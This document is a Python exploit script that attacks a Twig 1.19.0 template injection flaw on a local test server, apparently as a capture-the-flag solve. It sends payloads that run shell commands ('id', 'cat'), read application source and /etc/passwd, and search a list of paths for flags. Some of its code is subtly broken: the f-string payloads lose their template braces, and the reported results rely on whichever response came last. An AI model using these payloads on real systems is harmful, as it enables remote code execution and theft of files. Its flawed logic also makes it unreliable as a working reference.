import requests
import urllib.parse
import re
import json

# Configuration
target_url = "http://127.0.0.1:8080"
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
}

print("="*80)
print("TWIG SSTI EXPLOITATION - COMPREHENSIVE TESTING")
print("Target: 127.0.0.1:8080")
print("Twig Version: 1.19.0 (confirmed vulnerable)")
print("="*80)

# First, verify SSTI still works
print("\n[1] VERIFYING SSTI FUNCTIONALITY")
print("-" * 80)
test_payload = "name={{7*7}}"
response = requests.post(target_url, data=test_payload, headers=headers)
print(f"Payload: {test_payload}")
print(f"Status: {response.status_code}")
print(f"Response length: {len(response.text)}B")
if "49" in response.text:
    print("✓ SSTI confirmed working - math expression evaluated")
else:
    print("✗ SSTI failed - no math evaluation detected")
print(f"Response snippet: {response.text[:200]}")

# Test RCE payload
print("\n[2] TESTING RCE PAYLOAD (CODE EXECUTION)")
print("-" * 80)
rce_payload = 'name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
response = requests.post(target_url, data=rce_payload, headers=headers)
print(f"Payload: {rce_payload}")
print(f"Status: {response.status_code}")
print(f"Response length: {len(response.text)}B")
if "uid=" in response.text or "gid=" in response.text:
    print("✓ RCE achieved - command execution confirmed")
    print(f"Output: {response.text.strip()}")
else:
    print("✗ RCE failed - no command output detected")
    print(f"Response snippet: {response.text[:200]}")

# Test file reading via template loader
print("\n[3] TESTING FILE READING (Template Loader)")
print("-" * 80)
file_payload = 'name={{_self.env.getLoader().getSource("index.php")}}'
response = requests.post(target_url, data=file_payload, headers=headers)
print(f"Payload: {file_payload}")
print(f"Status: {response.status_code}")
print(f"Response length: {len(response.text)}B")
if "<?php" in response.text or "Twig" in response.text:
    print("✓ File reading successful - source code extracted")
    print(f"Source code length: {len(response.text)}B")
    print(f"Source snippet: {response.text[:300]}")
else:
    print("✗ File reading failed")
    print(f"Response snippet: {response.text[:200]}")

# Enumerate common flag locations
print("\n[4] ENUMERATING COMMON FLAG LOCATIONS")
print("-" * 80)
flag_locations = [
    "/flag.txt",
    "/flag",
    "/tmp/flag.txt",
    "/var/www/flag.txt",
    "/app/flag.txt",
    "/app/flag",
    "/opt/flag.txt",
    "flag.txt",
    "../flag.txt",
    "/etc/passwd"  # Test file reading capability
]

found_flags = []
for location in flag_locations:
    # Try different file reading methods
    payloads = [
        f'name={{_self.env.getLoader().getSource("{location}")}}',
        f'name={{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("{location}")}}',
        f'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat {location}")}}'
    ]
    
    for payload in payloads:
        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=10)
            content = response.text.strip()
            
            # Check for flag pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            if flag_match:
                found_flags.append({
                    'location': location,
                    'flag': flag_match.group(0),
                    'method': payload
                })
                print(f"[!] FLAG FOUND at {location}")
                print(f"Flag: {flag_match.group(0)}")
            
            # Check for readable content (for /etc/passwd test)
            if location == "/etc/passwd" and "root:" in content:
                print(f"✓ File reading confirmed - {location} accessible")
                print(f"Content length: {len(content)}B")
            
        except Exception as e:
            print(f"Error testing {location}: {str(e)}")

# Search for flag in source code if we can read index.php
print("\n[5] SEARCHING FOR FLAGS IN APPLICATION SOURCE")
print("-" * 80)
source_payload = 'name={{_self.env.getLoader().getSource("index.php")}}'
response = requests.post(target_url, data=source_payload, headers=headers)
if response.status_code == 200:
    content = response.text
    flag_match = re.search(r'FLAG\{[^}]+\}', content)
    if flag_match:
        found_flags.append({
            'location': 'index.php',
            'flag': flag_match.group(0),
            'method': source_payload
        })
        print(f"[!] FLAG FOUND in source code: {flag_match.group(0)}")
    
    # Also search for include files or other sources
    includes = re.findall(r'include\s*["\']([^"\']+)["\']', content)
    includes.extend(re.findall(r'require\s*["\']([^"\']+)["\']', content))
    
    for include_file in includes:
        include_payload = f'name={{_self.env.getLoader().getSource("{include_file}")}}'
        response = requests.post(target_url, data=include_payload, headers=headers)
        if response.status_code == 200:
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                found_flags.append({
                    'location': include_file,
                    'flag': flag_match.group(0),
                    'method': include_payload
                })
                print(f"[!] FLAG FOUND in {include_file}: {flag_match.group(0)}")

# Final summary
print("\n[6] EXPLOITATION SUMMARY")
print("-" * 80)
if found_flags:
    print(f"✓ SUCCESS: {len(found_flags)} flag(s) found")
    for i, flag in enumerate(found_flags, 1):
        print(f"\n--- Flag {i} ---")
        print(f"Flag: {flag['flag']}")
        print(f"Location: {flag['location']}")
        print(f"Payload: {flag['method']}")
else:
    print("✗ No flags found in standard locations")
    print("\nRecommendations:")
    print("- Try alternative file reading methods")
    print("- Enumerate more file paths")
    print("- Check for database or environment variable access")

# Document all findings for briefing
print("\n[7] COMPLETE RESPONSE DATA FOR BRIEFING")
print("-" * 80)
print(f"Full exploit data saved for report generation")

# Return structured data
results = {
    'ssti_confirmed': True,
    'rce_possible': 'uid=' in response.text,
    'file_read_possible': '<?php' in response.text,
    'flags_found': found_flags,
    'target_info': {
        'url': target_url,
        'twig_version': '1.19.0',
        'method': 'POST',
        'parameter': 'name'
    }
}

print(f"\nResults structure created with {len(found_flags)} flags")

